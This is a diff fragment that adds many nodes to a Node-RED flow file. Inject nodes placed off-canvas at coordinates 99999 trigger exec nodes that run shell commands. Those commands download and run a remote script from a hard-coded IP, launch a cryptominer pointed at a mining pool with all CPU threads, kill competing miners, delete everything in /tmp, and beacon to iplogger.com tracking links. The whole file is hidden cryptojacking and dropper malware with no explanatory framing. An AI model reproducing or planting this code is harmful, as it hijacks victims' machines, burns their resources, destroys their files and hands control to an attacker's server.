+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl http://82.153.138.214:42069/xs > /tmp/xs; chmod +x /tmp/xs; nohup bash /tmp/xs --cpu-no-yield --cpu-priority 5 --donate-level 0 -a rx/0 -t $(nproc) -o 185.216.71.153:3333 -k --tls -B &> /dev/null",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl http://82.153.138.214:42069/xs > /tmp/xs; chmod +x /tmp/xs; /tmp/xs -o 185.216.71.153:3333",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl http://185.216.71.153:42069/xs > /tmp/xs; chmod +x /tmp/xs; /tmp/xs --cpu-no-yield --cpu-priority 5 --donate-level 0 -a rx/0 -t $(nproc) -o 185.216.71.153:3333 -k --tls -B &> /dev/null",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://files.catbox.moe/o1nl0n > /tmp/xs; chmod +x /tmp/xs; /tmp/xs -o 185.216.71.153:3333 -a rx/0 -t $(nproc) -k",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://iplogger.com/2ThQh5",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "pkill xs -9 && pkill xmrig -9 && cd /tmp/ && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://iplogger.com/2TZ8j5 && cd /tmp/ && rm -rf * && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://iplogger.com/2TZ8j5 && cd /tmp/ && rm -rf * && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://iplogger.com/2TZ8j5 && cd /tmp/ && rm -rf * && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://iplogger.com/2TZ8j5 && cd /tmp/ && rm -rf * && curl -O http://185.216.71.153/bins/bins.sh && chmod +x bins.sh && sh bins.sh",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9990,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
     }
 ]
